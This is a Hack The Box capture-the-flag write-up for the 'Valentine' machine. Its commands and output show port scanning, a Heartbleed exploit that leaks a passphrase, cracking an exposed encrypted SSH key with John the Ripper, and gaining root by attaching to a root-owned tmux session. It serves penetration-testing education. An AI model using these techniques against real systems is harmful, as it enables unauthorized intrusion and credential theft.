---
title: 'Valentine Writeup'
date: 2018-07-27
thumbnailImagePosition: left
thumbnailImage: /img/posts/2018/07/valentine-writeup/valentine-banner.jpg
coverImage: /img/posts/2018/07/valentine-writeup/valentine-banner.jpg
coversize: partial
coverMeta: out
metaAlignment: center
clearReading: true
categories:
- Hackthebox
- CTF
- Writeup
tags:
- hackthebox
- htb
- pentest
- ctf
showTags: false
showPagination: true
showSocial: true
showDate: true
comments: false
summary: "Heartbleeds and dirty cows, i feel sorry for the creator!"
---
Connecting to Hack the Box[^1] using the supplied VPN, my Valentine box have the IP: 10.10.10.79
As per usual, lets start with Recon and NMAP the target IP
```
root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-02 22:27 CET
Nmap scan report for 10.10.10.79
Host is up (0.049s latency).
Not shown: 65532 closed ports
PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp    open   http      Apache httpd 2.2.22 ((Ubuntu))
443/tcp   open   ssl/http  Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
```
So we are dealing with some kind of webserver.
The root directory of the address is only displaying an image on both webports (80/443), next step would be trying to enumerate directories!  
![Valentine root image](/img/posts/2018/07/valentine-writeup/omg-1.jpg)  
I usually use the tool "gobuster" to enumerate webdirectories with a wordlist, and point it to Burpsuite Proxy. That way, any link or directory that gobuster finds, will Burpsuite automatically spider as well as record in its console.  
So lets point gobuster towards the webserver and let it run in the background
```
root@kali:~/Valentine$ gobuster -u http://10.10.10.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -p 127.0.0.1:8080 -x php
```
Now sticking with the theme Valentine, the image is referencing the exploit Heartbleed[^2] which targets SSL (port 443). its also available on ExploitDB, therefor theres a local variant in kali. You might though have to run this a couple times to get the data thats relevant.
```
root@kali:~/Valentine$ searchsploit heartbleed
root@kali:~/Valentine$ cp /usr/share/exploitdb/exploits/multiple/remote/32764.py .
root@kali:~/Valentine$ python 32764.py 10.10.10.79 > heartbleed.txt
root@kali:~/Valentine$ cat heartbleed.txt
[..snip..]
00f0: 01 00 00 00 10 00 0E 00 00 0B 31 30 2E 31 30 2E ..........10.10.
0100: 31 30 2E 37 39 6F 6E 2F 78 2D 77 77 77 2D 66 6F 10.79on/x-www-fo
0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C
0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4
0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc
0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld
0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 43 mV0aGVoeXBlCg==C
0160: 05 16 1F AC BA A4 D1 E0 45 10 F2 B0 B6 9E 4B 30 ........E.....K0
0170: 01 06 7D 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C ..}.............
0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
[..snip..]
```
Now that $text parameter in the response looks like a base64 encoded string.  
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```
root@kali:~/Valentine$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
heartbleedbelievethehype
```
Lets save that to the notes and pop back to see what the result of gobuster is up to.
```
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 200
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
[+] Proxy        : 127.0.0.1:8080
[+] Extensions   : .php
=====================================================
/index (Status: 200)
/index.php (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/decode (Status: 200)
/decode.php (Status: 200)
/omg (Status: 200)
=====================================================
```
So encode and decode just seems to be two php functions that does what they say to base64 strings. They didn't seems that vulnerable to command injections either. But /dev looks interesting , browsing to that reveals two files.  
![Valentine_Slash_dev](/img/posts/2018/07/valentine-writeup/Valentine_Slash_dev.png)  
Taking a peek at notes.txt shows a checklist.
```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```
The file hype_key contains an ASCII encoded SSH Private Key, so download that and pipe it to xxd.
```
root@kali:~/Valentine$ cat hype_key | xxd -r -p > rsa.encrypted
root@kali:~/Valentine$ cat rsa.encrypted
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
[..super snip..]
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```
According to Proc-Type its encrypted, so next step would be to decrypt it using JohnTheRipper!  
First lets create a JTR compatible file to crack, then remembering the decoded base64 string before, might be the password.
```
root@kali:~/Valentine$ ssh2john rsa.encrypted > rsa.john
root@kali:~/Valentine$ echo "heartbleedbelievethehype" | john --stdin rsa.johnssh
```
That should successfully crack the Private Key!  
Now we only need to change the permissions and try to connect, what we're missing is the username to connect with, but reading the private keys filename "hype_key", we can always try "hype".
```
root@kali:~/Valentine$ chmod 0600 rsa.encrypted
root@kali:~/Valentine$ ssh -i rsa.encrypted hype@10.10.10.79
Enter passphrase for key 'rsa.encrypted': heartbleedbelievethehype
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$
```
So that takes care of the initial shell, now lets enumerate the system and see what we can find out to Privilege Escalate to root!  
G0tmi1k[^3] Has a really good cheat sheets in how to enumerate linux systems!  
So lets do some basic things.
```
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
So having a kernel means that it might be vulnerable to the Dirtycow[^4] exploit.  
But generally using such exploit is frowned upon since it might crash the box and ruin the day for other people.  
So lets continue enumerating and hope we find something else.
```
hype@Valentine:~$ history
.....snip....
8 ls -la
9 tmux -L dev_sess
10 tmux a -t dev_sess
11 tmux --help
12 tmux -S /.devs/dev_sess
13 exit
.....snip....
```
Now running history shows that theres a tmux session (item 12) hype connected to, and running "ps -aux" to check all running processes also shows that the tmux session is running as root.  
Lets connect to the same session.
```
hype@Valentine:~$ !12
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
```
Done!

[^1]: [www.hackthebox.eu](www.hackthebox.eu)
[^2]: [www.heartbleed.com](http://heartbleed.com/)
[^3]: [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[^4]: [www.dirtycow.ninja](https://dirtycow.ninja)
